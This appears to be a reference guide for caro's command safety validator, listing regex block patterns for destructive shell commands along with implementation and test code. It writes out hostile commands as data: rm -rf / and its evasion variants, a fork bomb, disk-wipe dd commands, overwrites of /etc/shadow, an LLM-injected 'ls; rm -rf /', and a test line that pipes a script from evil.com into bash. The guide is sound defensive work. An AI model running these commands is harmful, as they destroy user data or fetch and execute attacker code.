# Safety Validation Patterns

> Reference guide for command safety validation in caro.

## Overview

The SafetyValidator module protects users from accidentally executing dangerous commands. It uses 52+ pre-compiled regex patterns to detect and categorize risky operations.

## Risk Level Taxonomy

| Level | Color | Description | Action |
|-------|-------|-------------|--------|
| Safe | Green | Normal operations | Execute immediately |
| Moderate | Yellow | Potentially risky | Confirm in strict mode |
| High | Orange | Could cause damage | Always confirm |
| Critical | Red | Destructive operation | Block or require explicit flag |

## Pattern Categories

### 1. System Destruction Patterns

**Critical - Always block:**
```rust
// Root/home deletion
r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?-[a-zA-Z]*r[a-zA-Z]*\s+/\s*$"   // rm -rf /
r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?-[a-zA-Z]*f[a-zA-Z]*\s+/\s*$"   // rm -fr /
r"rm\s+-[a-zA-Z]*\s+~/?$"                                         // rm -rf ~

// Wildcard in current directory (CRITICAL - added in v1.0.4)
r"rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+\*\s*$"                       // rm -rf *
r"rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+\.\s*$"                       // rm -rf .

// Current directory deletion
r"rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+\.\s*$"                             // rm -r .
r"rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+\.\.\s*$"                           // rm -r ..
```

**Why this matters:**
- `rm -rf /` - Destroys entire filesystem
- `rm -rf ~` - Deletes all user data
- `rm -rf *` - Deletes everything in current directory (common mistake)
- `rm -rf .` - Deletes current directory and all contents

### 2. Fork Bombs

**Critical - Always block:**
```rust
r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"     // :(){ :|:& };:
r"\./*\s*&\s*\./*"                               // ./* & ./*
r"while\s+true\s*;\s*do\s*.+\s*done"            // while true; do ... done (loops)
```

### 3. Disk Operations

**Critical:**
```rust
r"mkfs"                                          // Filesystem creation
r"dd\s+.*if=/dev/(zero|random|urandom)"         // Disk overwrite
r"dd\s+.*of=/dev/[sh]d[a-z]"                    // Direct disk write
r"fdisk\s+/dev/"                                 // Partition table modification
r"parted\s+/dev/"                                // Partition management
```

### 4. Privilege Escalation

**High:**
```rust
r"sudo\s+su\s*$"                                 // Root shell
r"sudo\s+-i"                                     // Interactive root
r"chmod\s+777\s+/"                               // World-writable root
r"chown\s+-R\s+\w+:\w+\s+/"                     // Recursive ownership change
```

### 5. Critical Path Access

**High to Critical:**
```rust
r">\s*/etc/passwd"                               // Overwrite passwd
r">\s*/etc/shadow"                               // Overwrite shadow
r"rm\s+.*\s+/bin"                                // Remove binaries
r"rm\s+.*\s+/usr"                                // Remove system files
r"rm\s+.*\s+/boot"                               // Remove boot files
```

### 6. Network Exfiltration

**Moderate to High:**
```rust
r"curl\s+.*\|\s*sh"                              // Pipe to shell
r"wget\s+.*\|\s*bash"                            // Download and execute
r"curl\s+.*-o\s+/tmp/"                           // Download to temp
```

## Implementation Pattern

### Validator Structure
```rust
use once_cell::sync::Lazy;
use regex::Regex;

pub struct SafetyValidator {
    patterns: &'static [CompiledPattern],
}

struct CompiledPattern {
    regex: Regex,
    risk_level: RiskLevel,
    category: PatternCategory,
    description: &'static str,
}

static PATTERNS: Lazy<Vec<CompiledPattern>> = Lazy::new(|| {
    compile_patterns()
});

impl SafetyValidator {
    pub fn validate(&self, command: &str) -> ValidationResult {
        for pattern in self.patterns {
            if pattern.regex.is_match(command) {
                return ValidationResult::Blocked {
                    risk_level: pattern.risk_level,
                    reason: pattern.description.to_string(),
                };
            }
        }
        ValidationResult::Safe
    }
}
```

### Validation Result
```rust
pub enum ValidationResult {
    Safe,
    Warning {
        risk_level: RiskLevel,
        reason: String,
    },
    Blocked {
        risk_level: RiskLevel,
        reason: String,
    },
}
```

## Testing Safety Patterns

### Unit Tests
```rust
#[test]
fn test_blocks_rm_rf_root() {
    let validator = SafetyValidator::new();
    assert!(matches!(
        validator.validate("rm -rf /"),
        ValidationResult::Blocked { .. }
    ));
}

#[test]
fn test_blocks_rm_rf_star() {
    let validator = SafetyValidator::new();
    // Critical pattern added in v1.0.4
    assert!(matches!(
        validator.validate("rm -rf *"),
        ValidationResult::Blocked { .. }
    ));
}

#[test]
fn test_allows_safe_rm() {
    let validator = SafetyValidator::new();
    assert!(matches!(
        validator.validate("rm file.txt"),
        ValidationResult::Safe
    ));
}
```

### Property-Based Tests
```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn safe_commands_never_blocked(cmd in "[a-z]+ [a-z]+\\.txt") {
        let validator = SafetyValidator::new();
        let result = validator.validate(&cmd);
        // Basic file operations should be safe
        assert!(!matches!(result, ValidationResult::Blocked { .. }));
    }
}
```

## Adding New Patterns

### Process
1. Identify the dangerous command or pattern
2. Write regex that matches the pattern without false positives
3. Assign appropriate risk level
4. Add descriptive message
5. Write test cases (both positive and negative)
6. Document in this reference

### Example: Adding a New Pattern
```rust
// In safety/patterns.rs
const NEW_PATTERN: PatternDef = PatternDef {
    pattern: r"curl\s+.*\|\s*(sudo\s+)?bash",
    risk_level: RiskLevel::Critical,
    category: PatternCategory::NetworkExfiltration,
    description: "Downloading and executing scripts without inspection",
};

// In tests
#[test]
fn test_blocks_curl_pipe_bash() {
    let validator = SafetyValidator::new();
    assert!(matches!(
        validator.validate("curl https://evil.com/script.sh | bash"),
        ValidationResult::Blocked { .. }
    ));
}

#[test]
fn test_allows_normal_curl() {
    let validator = SafetyValidator::new();
    assert!(matches!(
        validator.validate("curl https://api.example.com/data"),
        ValidationResult::Safe
    ));
}
```

## User Experience

### Warning Display
```rust
fn display_warning(result: &ValidationResult) {
    match result {
        ValidationResult::Warning { risk_level, reason } => {
            eprintln!("{} {}",
                "Warning:".yellow().bold(),
                reason
            );
            eprintln!("Risk level: {}", format_risk_level(risk_level));
            eprintln!("\nProceed anyway? [y/N]");
        }
        ValidationResult::Blocked { risk_level, reason } => {
            eprintln!("{} {}",
                "BLOCKED:".red().bold(),
                reason
            );
            eprintln!("Risk level: {}", format_risk_level(risk_level));
            eprintln!("\nUse --allow-dangerous to override (not recommended)");
        }
        ValidationResult::Safe => {}
    }
}
```

### Configuration Override
```toml
# ~/.config/caro/config.toml
[safety]
enabled = true
level = "moderate"  # strict, moderate, permissive
custom_blocked_patterns = [
    "my_dangerous_command",
]
custom_allowed_patterns = [
    "rm -rf /tmp/cache/*",  # Known safe pattern
]
```

## Common False Positives

### Legitimate Use Cases
Some commands that match dangerous patterns may be legitimate:

```rust
// These look dangerous but may be intentional
"rm -rf /tmp/build/*"      // Cleaning build cache
"rm -rf ./node_modules"    // Cleaning npm modules
"dd if=/dev/zero of=test.img bs=1M count=100"  // Creating test image
```

### Mitigation Strategies
1. **Path-aware validation**: Allow dangerous operations on known-safe paths
2. **Context detection**: Consider working directory when evaluating risk
3. **User patterns**: Allow users to whitelist specific commands
4. **Explanation prompts**: Ask user to confirm with understanding of risk

## Security Considerations

### Pattern Evasion
Attackers may try to evade detection:

```bash
# Direct pattern
rm -rf /

# Evasion attempts
r\m -rf /
$(echo rm) -rf /
eval "rm -rf /"
```

**Mitigation**: Normalize commands before validation (expand variables, aliases).

### Injection via LLM
The LLM might generate commands with injected content:

```bash
# Prompt: "list files"
# Malicious generation: "ls; rm -rf /"
```

**Mitigation**: Validate the complete generated command, including any chained operations.
